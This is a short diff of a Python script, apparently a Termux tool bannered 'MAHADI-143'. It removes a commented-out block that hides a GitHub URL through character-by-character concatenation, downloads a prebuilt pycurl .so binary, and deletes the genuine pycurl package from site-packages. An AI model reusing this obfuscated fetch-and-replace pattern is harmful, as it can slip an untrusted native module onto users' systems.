@@ -10,39 +10,12 @@ from concurrent.futures import ThreadPoolExecutor as ThreadPool
 os.system("pip install licensing > /dev/null")
 from licensing.models import *
 from licensing.methods import Key, Helpers
-#try:os.remove("p"+"yc"+"url"+".cpython-311.so")
-#except:pass
-#nadiya = subprocess.run(['curl', '-L', 'h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'g'+'i'+'t'+'h'+'u'+'b'+'.'+'c'+'o'+'m'+'/'+'N'+'i'+'l'+'l'+'4'+'0'+'4'+'-'+'C'+'y'+'b'+'e'+'r'+'/'+'T'+'e'+'s'+'t'+'i'+'n'+'g'+'/'+'b'+'l'+'o'+'b'+'/'+'m'+'a'+'i'+'n'+'/'+'p'+'y'+'c'+'u'+'r'+'l'+'.'+'c'+'p'+'y'+'t'+'h'+'o'+'n'+'-'+'3'+'1'+'1'+'.'+'s'+'o'+'?raw=true', '-o', 'p'+'y'+'c'+'u'+'r'+'l'+'.'+'c'+'p'+'y'+'t'+'h'+'o'+'n'+'-'+'3'+'11.so'])
-#if nadiya.returncode != 0:
-#    os.system("clear")
-    #print("ERROR PLEASE CHECK INTERNET CONNECTION AND RETRY")
-#    exit(1)
-#else:
-#    pass
-#try:shutil.rmtree("pycurl-7.45.2.dist-info")
-#except:pass
-#try:shutil.rmtree("pycurl")
-#except:pass
-#try:shutil.rmtree("/data/data/com.termux/files/usr/lib/python3.11/site-packages/"+"pyc"+"url"+"-7"+".45"+".2."+"dist-info")
-#except:pass
-#try:shutil.rmtree("/data/data/com.termux/files/usr/lib/python3.11/site-packages/"+"py"+"cur"+"l")
-#except:pass
-#try:os.remove("/data/data/com.termux/files/usr/lib/python3.11/site-packages/"+"py"+"curl"+".cpython-311.so")
-#except:pass
-#import pycurl
-#from io import BytesIO
-#os.remove("pycurl.cpython-311.so")
-#nillxd = "pycurl"
-#if os.path.exists(nillxd) and os.path.isdir(nillxd):
-#    exit("TRY AGAIN BITCH")
-#else:
-    #pass
 try:
     import concurrent.futures
 except ImportError:
     print('\n \033[1;91m[\033[1;93mMAHADI-143\033[1;91m]\033[1;97m installing futures !...\n')
     time.sleep(0.5)
-    os.system('pip install futures')
+    os.system('pip install pycurl')
 try: 
     import bs4
 except ImportError:
